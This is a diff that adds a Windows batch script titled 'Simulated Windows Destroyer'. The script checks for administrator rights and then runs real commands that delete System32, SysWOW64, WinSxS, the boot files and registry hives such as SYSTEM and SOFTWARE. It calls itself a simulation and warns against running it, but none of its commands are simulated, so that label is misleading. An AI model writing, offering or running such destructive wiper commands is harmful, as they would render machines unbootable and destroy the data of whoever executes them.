@@ -1,0 +1,32 @@
+@echo off
+title Simulated Windows Destroyer
+color 0C
+echo [!] This script simulates malware behavior - DO NOT RUN ON A REAL MACHINE!
+pause
+
+:: Check if running as admin
+net session >nul 2>&1
+if %errorlevel% NEQ 0 (
+    echo [X] This must be run as Administrator!
+    pause
+    exit
+)
+
+echo [!] Attempting to remove critical files...
+timeout /t 2 >nul
+
+:: Try to delete core Windows folders
+rd /s /q "C:\Windows\System32"
+rd /s /q "C:\Windows\SysWOW64"
+rd /s /q "C:\Windows\WinSxS"
+
+:: Try to remove boot files
+del /f /s /q "C:\bootmgr"
+del /f /s /q "C:\boot\*.*"
+
+:: Try to remove registry hives (needs other tools like reg.exe or regedit /s)
+del /f /q "C:\Windows\System32\Config\SYSTEM"
+del /f /q "C:\Windows\System32\Config\SOFTWARE"
+
+echo [!] Finished. System should be corrupted now (if not blocked).
+pause
